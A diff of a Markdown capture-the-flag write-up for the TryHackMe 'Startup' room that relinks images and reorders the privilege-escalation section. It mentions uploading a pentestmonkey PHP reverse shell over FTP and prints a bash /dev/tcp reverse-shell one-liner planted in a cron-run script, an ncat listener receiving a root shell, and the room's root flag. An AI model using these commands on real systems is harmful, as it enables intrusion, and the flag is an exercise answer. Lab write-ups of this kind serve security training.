@@ -184,13 +184,15 @@ Page Link: http://10.10.0.163/files
 
 <br/>
 
-![Alt text](../images/Startup/Picure-1.jpg "FTP Directory")
+![Alt text](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Startup/Picture-1.jpg "FTP Directory")
 
 We can Clearly observe that this directory is ftp directory. So Lets Check wether we can upload some file or not. <br/>
 We have Write access to ftp directory <br/>
 
 We use pentestmonkey php reverse shell <br/>
 https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+![Alt text](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Startup/Picture-2.jpg "FTP Directory")
 
 ```
 root@ip-10-10-4-152:~# ftp 10.10.100.88
@@ -324,67 +326,11 @@ echo $LIST > /home/lennie/scripts/startup_list.txt
 /etc/print.sh
 lennie@startup:~/scripts$
 
-
-lennie@startup:~/scripts$ cat /etc/print.sh
-bash -c "bash -i >& /dev/tcp/10.9.4.122/4242 0>&1"
-lennie@startup:~/scripts$
-
-Microsoft Windows [Version 6.1.7601]
-Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
-
-C:\Users\something>ncat -lvp 4242
-Ncat: Version 7.91 ( https://nmap.org/ncat )
-Ncat: Listening on :::4242
-Ncat: Listening on 0.0.0.0:4242
-Ncat: Connection from 10.10.128.197.
-Ncat: Connection from 10.10.128.197:54742.
-bash: cannot set terminal process group (6654): Inappropriate ioctl for device
-bash: no job control in this shell
-root@startup:~# ls
-ls
-root.txt
-root@startup:~# cat root.txt
-cat root.txt
-THM{f963aaa6a430f210222158ae15c3d76d}
-
-```
-
-## Task 2: Credits
-
-```
-1. Congratulations
-
-Ans: No Anwers Needed.
-
 ```
 
 ```
-lennie@startup:~/scripts$ cat planner.sh
-#!/bin/bash
-echo $LIST > /home/lennie/scripts/startup_list.txt
-/etc/print.sh
-lennie@startup:~/scripts$ lennie@startup:~/scripts$ cat planner.sh
-bash: lennie@startup:~/scripts$: No such file or directory
-lennie@startup:~/scripts$ #!/bin/bash
-lennie@startup:~/scripts$ echo $LIST > /home/lennie/scripts/startup_list.txt
-bash: /home/lennie/scripts/startup_list.txt: Permission denied
-lennie@startup:~/scripts$ /etc/print.sh
-bash: connect: Connection refused
-bash: /dev/tcp/10.9.4.122/4242: Connection refused
-lennie@startup:~/scripts$ lennie@startup:~/scripts$
-bash: lennie@startup:~/scripts$: No such file or directory
-lennie@startup:~/scripts$ clear
-lennie@startup:~/scripts$ cat /etc/print.sh
-bash -c "bash -i >& /dev/tcp/10.9.4.122/4242 0>&1"
-lennie@startup:~/scripts$ lennie@startup:~/scripts$ cat /etc/print.sh
-bash: lennie@startup:~/scripts$: No such file or directory
-lennie@startup:~/scripts$ bash -c "bash -i >& /dev/tcp/10.9.4.122/4242 0>&1"
-bash: connect: Connection refused
-bash: /dev/tcp/10.9.4.122/4242: Connection refused
-lennie@startup:~/scripts$ lennie@startup:~/scripts$
-bash: lennie@startup:~/scripts$: No such file or directory
-lennie@startup:~/scripts$ cd ../
-lennie@startup:~$ ls
+Running LinPeas on System
+
 Documents  linpeas.sh  scripts  user.txt
 lennie@startup:~$ ./linpeas.sh
 
@@ -1019,4 +965,37 @@ ENCRYPT_METHOD SHA512
 ╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
 
 lennie@startup:~$
+```
+
+```
+lennie@startup:~/scripts$ cat /etc/print.sh
+bash -c "bash -i >& /dev/tcp/10.9.4.122/4242 0>&1"
+lennie@startup:~/scripts$
+
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\something>ncat -lvp 4242
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::4242
+Ncat: Listening on 0.0.0.0:4242
+Ncat: Connection from 10.10.128.197.
+Ncat: Connection from 10.10.128.197:54742.
+bash: cannot set terminal process group (6654): Inappropriate ioctl for device
+bash: no job control in this shell
+root@startup:~# ls
+ls
+root.txt
+root@startup:~# cat root.txt
+cat root.txt
+THM{f963aaa6a430f210222158ae15c3d76d}
+```
+
+## Task 2: Credits
+
+```
+1. Congratulations
+
+Ans: No Anwers Needed.
+
 ```
